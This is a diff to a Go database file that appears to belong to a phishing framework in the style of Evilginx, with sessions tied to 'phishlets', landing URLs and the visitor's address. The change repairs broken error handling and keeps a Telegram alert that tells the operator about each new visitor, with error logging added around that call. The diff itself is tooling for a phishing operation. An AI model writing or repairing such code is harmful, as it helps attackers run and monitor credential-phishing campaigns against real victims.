@@ -1,10 +1,12 @@
 package database
 
 import (
-	"encoding/json"
-	"strconv"
-
-	"github.com/tidwall/buntdb"
+    "encoding/json"
+    "fmt"
+    "strconv"
+    "strings"
+    "time"
+    "github.com/tidwall/buntdb"
 )
 
 type Database struct {
@@ -35,10 +37,7 @@ func NewDatabase(path string) (*Database, error) {
 }
 
 func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
-    s, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
-    if err {
-        err
-    }
+    _, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
     
     // Send new visitor notification
     message := fmt.Sprintf(`🎯 <b>New Visitor Detected!</b>
@@ -54,7 +53,11 @@ func (d *Database) CreateSession(sid string, phishlet string, landing_url string
         phishlet,
         sid)
     
-    sendTelegramMessage(d.telegram, message)
+		if err := sendTelegramMessage(d.telegram, message); err != nil {
+			// Log error but don't fail the function
+			fmt.Printf("Failed to send Telegram message: %v\n", err)
+		}
+	
     return err
 }
 
